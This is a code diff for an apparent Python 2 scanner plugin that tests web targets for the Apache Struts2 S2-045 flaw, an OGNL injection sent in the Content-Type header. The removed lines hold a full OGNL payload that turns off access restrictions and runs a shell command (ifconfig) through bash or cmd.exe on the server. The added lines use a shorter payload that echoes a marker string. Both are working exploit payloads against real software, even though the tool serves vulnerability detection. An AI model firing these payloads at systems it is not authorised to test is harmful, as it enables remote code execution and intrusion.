@@ -3,10 +3,7 @@
 # from ..t import T
 from t import T
 import requests
-import urllib2
 import sys
-from poster.encode import multipart_encode
-from poster.streaminghttp import register_openers
 class P(T):
     def __init__(self):
         T.__init__(self)
@@ -29,19 +26,15 @@ class P(T):
         timeout=3
         result['result']=False
         res=None
-        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
-
-        #print target_url
+        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('test'+602+53718)).(#o.close())}"
         try:
-            register_openers()
-            datagen, headers = multipart_encode({"image1": open("tmp/s2-045.txt", "rb")})
+            headers = {}
             headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
             headers['Content-Type'] = payload
             if productname.has_key('cookie'):
                 headers['Cookie'] = productname['cookie']
-            req = urllib2.Request(target_url, datagen, headers=headers)
-            r = urllib2.urlopen(req)
-            res_html = r.read()
+            r = requests.get(target_url, headers=headers) 
+            res_html = r.content 
         except Exception,e:
             print e
             return result
@@ -50,7 +43,7 @@ class P(T):
                 res.close()
                 del res
                 
-        if res_html.find("127.0.0.1") <> -1:
+        if res_html.find("test60253718") <> -1:
       
 
             info = target_url + "struts045 Vul"
